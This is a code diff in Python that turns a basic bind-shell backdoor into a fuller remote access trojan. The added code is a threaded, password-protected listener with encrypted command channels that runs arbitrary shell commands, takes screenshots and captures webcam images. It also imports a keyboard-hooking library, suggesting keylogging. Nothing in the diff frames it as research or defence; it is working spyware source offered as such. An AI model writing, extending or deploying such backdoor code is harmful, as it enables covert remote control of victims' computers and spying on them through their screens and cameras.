@@ -1,15 +1,80 @@
 import socket
 import subprocess
+import threading
+import base64
+import hashlib
+import io
+import logging
+import os
+import platform
+import shutil
+import sys
+from cryptography.fernet import Fernet
+from pynput import keyboard
+from PIL import ImageGrab
+import cv2
+import requests
+import os
 
-def backdoor():
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.bind(('0.0.0.0', 4444))
-    s.listen(1)
-    conn, addr = s.accept()
+def capture_screenshot():
+    img = ImageGrab.grab()
+    buf = io.BytesIO()
+    img.save(buf, format='PNG')
+    return buf.getvalue()
+
+def capture_webcam_image():
+    cap = cv2.VideoCapture(0)
+    ret, frame = cap.read()
+    cap.release()
+    if not ret:
+        return None
+    _, buf = cv2.imencode('.jpg', frame)
+    return buf.tobytes()
+
+def handle_client(client_socket, backdoor_password):
+    try:
+        encryptor = Fernet(base64.urlsafe_b64encode(hashlib.sha256(backdoor_password.encode()).digest()))
+        client_socket.send(b"Password: ")
+        encrypted_password = client_socket.recv(1024)
+        password = encryptor.decrypt(encrypted_password).decode().strip()
+        if password != backdoor_password:
+            client_socket.send(encryptor.encrypt(b"Authentication failed.\n"))
+            client_socket.close()
+            return
+        client_socket.send(encryptor.encrypt(b"Authenticated. Enter commands:\n"))
+        while True:
+            encrypted_command = client_socket.recv(4096)
+            if not encrypted_command:
+                break
+            command = encryptor.decrypt(encrypted_command).decode().strip()
+            if command == "exit":
+                break
+            elif command == "screenshot":
+                img_data = capture_screenshot()
+                client_socket.send(len(img_data).to_bytes(4, 'big'))
+                client_socket.send(img_data)
+            elif command == "webcam_snap":
+                img_data = capture_webcam_image()
+                if img_data:
+                    client_socket.send(len(img_data).to_bytes(4, 'big'))
+                    client_socket.send(img_data)
+                else:
+                    client_socket.send(b"0")
+            else:
+                output = subprocess.getoutput(command)
+                client_socket.send(output.encode() + b"\n")
+    except Exception as e:
+        logging.error(f"Error handling client: {e}")
+    finally:
+        client_socket.close()
+
+def backdoor_listener(port, backdoor_password):
+    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server.bind(("0.0.0.0", port))
+    server.listen(5)
+    logging.info(f"Backdoor listening on port {port}")
+
     while True:
-        command = conn.recv(1024).decode()
-        if command.lower() == 'exit':
-            break
-        output = subprocess.getoutput(command)
-        conn.send(output.encode())
-    conn.close()
+        client_socket, addr = server.accept()
+        logging.info(f"Connection from {addr}")
+        threading.Thread(target=handle_client, args=(client_socket, backdoor_password)).start()
